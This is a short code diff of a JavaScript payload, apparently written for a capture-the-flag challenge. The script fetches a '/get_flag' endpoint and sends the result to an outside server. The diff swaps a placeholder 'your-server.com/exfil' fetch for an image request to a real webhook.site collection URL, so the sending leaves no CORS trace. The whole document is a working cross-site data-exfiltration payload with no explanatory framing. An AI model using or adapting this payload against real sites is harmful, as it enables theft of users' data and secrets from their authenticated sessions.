@@ -1,8 +1,6 @@
 fetch('/get_flag')
-  .then(response => response.text())
-  .then(flag => {
-    // Exfil to your server (replace with your endpoint)
-    fetch('https://your-server.com/exfil?flag=' + encodeURIComponent(flag));
-    // Or use img for no-CORS: new Image().src = 'https://your-server.com/exfil?flag=' + encodeURIComponent(flag);
-  })
-  .catch(error => console.error('Failed to fetch flag:', error));
+       .then(response => response.text())
+       .then(flag => {
+         new Image().src = 'https://webhook.site/cb15343c-3eab-44e7-9197-4b932bed14e6?flag=' + encodeURIComponent(flag);
+       })
+       .catch(error => console.error('Failed to fetch flag:', error));
